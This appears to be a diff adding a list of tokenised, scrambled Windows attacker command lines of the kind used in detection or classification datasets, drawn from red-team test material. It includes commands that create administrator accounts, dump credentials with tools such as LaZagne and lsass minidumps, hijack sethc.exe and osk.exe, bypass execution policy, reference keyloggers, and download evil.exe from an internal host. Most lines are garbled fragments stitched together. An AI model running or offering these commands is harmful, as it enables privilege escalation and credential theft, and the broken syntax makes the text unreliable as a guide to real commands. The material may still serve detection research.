@@ -1,0 +1,64 @@
+net user `` $ shadow username admins `` $ { \programdata\microsoft\windows\start \users\
+namp -sn $ volumn command= $ target = `` $ { filename_regex } @ `` $ { shadow % components\atomic_test ) /v `` keylog
+iediagcmd.exe /out : $ wscriptshell.createshortcut exit ''
+silentrunner.exe $ { { manager\appcertdlls { processors\atomicredteam '' -name `` cor_profiler
+net group `` hkey_local_machine\system\currentcontrolset\control\session manager\appcertdlls /v '' `` select * ''
+net user administrator = `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } binpath=
+ffuf -w $ group -member : )
+net localgroup administrators `` $ { filename_regex }
+net localgroup administrators `` @ `` `` $ { filename_regex }
+set-executionpolicy -executionpolicy bypass -scope localmachine
+net user administrator /add
+echo `` $ `` hklm\software\microsoft\windows t1547.009 software\classes\clsid\ `` hklm\software\microsoft\windows t1547.009 within .historysavepath
+ffuf -w $ consumerargs
+namp -sn $ : volumn name you ( new-object -comobject ; querylanguage= keylog
+net group `` hklm\software\microsoft\active nt\currentversion\winlogon\notify\atomicredteam '' -name `` minidump : \windows\system32\sethc.exe /grant administrators : = `` keylog
+namp -sn $ { user_name } '' `` $ { filename_regex }
+net group `` domain admins '' `` $ { weak_service_name } \inprocserver32 '' $ true
+namp -sn $ { filename_regex }
+icacls % windir % \system32\osk.exe /grant administrators administrators @ -name : cor_profiler
+dir -executionpolicy -verbose
+get-childitem -filter `` 7 execution -name `` cor_enable_profiling = reg_dword logon/logoff
+namp -sn $ { output_zip_name } /add `` @ `` $ { user_name } @ `` $ wscriptshell.createshortcut driver } objws.run `` administrators } in @ % '' \windows\system32\sethc.exe
+rdrleakdiag.exe /p namp -sn $ target '' t1547.009 . `` c : //raw.githubusercontent.com/s3cur3th1ssh1t , minidump { lsass .id $ ( `` http : //192.168.1.29:9000/payload/evil.exe -o ) ;
+net `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' /f
+copy `` .\lazagne exe all
+ffuf -w $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } -l $ profile
+hack-browser-data-windows-64bit.exe
+powershell -ibck $ administrators $ { filename_regex }
+copy `` hklm\software\microsoft\windows powershell `` domain -u `` $ { registry_path }
+del % appdata % \system32\osk.exe
+net user administrator /add
+`` hkey_current_user\control hklm\security\policy\secrets % \system32\osk.exe
+cmdkey /list
+unregmp2.exe /hidewmp
+net group `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /f
+net group `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest `` `` $ profile
+gpresult /z
+reg query 0 0 : \windows\system32\sethc.exe /grant administrators : -name : filter = `` keylog
+bitsadmin.exe /create $ { ip
+dir /setnotifycmdline $ { bits_job_name } -l $ { filename_regex }
+icacls % windir % \updater.exe
+net user administrator /add
+gpresult /z
+net localgroup administrators `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins '' `` `` $ { filename_regex }
+rdrleakdiag.exe /p % windir % \system32\osk.exe % -- logon /d $ true
+net user administrator /domain
+net user user /domain
+net localgroup administrators
+query user
+net localgroup administrators -executionpolicy ' querylanguage= '' `` $ : \users\
+cmdkey /list
+net user administrator /add
+dirname_regex = `` domain
+net localgroup administrators
+lazagne.exe windows
+`` `` hklm\software\microsoft\windows \users\ $ : -c `` domain admins '' `` $ { filename_regex }
+net localgroup administrators
+reg add `` username `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' '' /t reg_dword /v debugger
+reg query hklm\software\microsoft
+keylogger_dll_invisible.dll \\ $ target = target ; -name users
+gobuster dir -w -sn $ { threads }
+bitsadmin.exe /create $ `` domain
+get-localgroupmember -name `` administrators : /add `` $ { filename_regex }
+rdrleakdiag.exe /p % \users\ $ profile
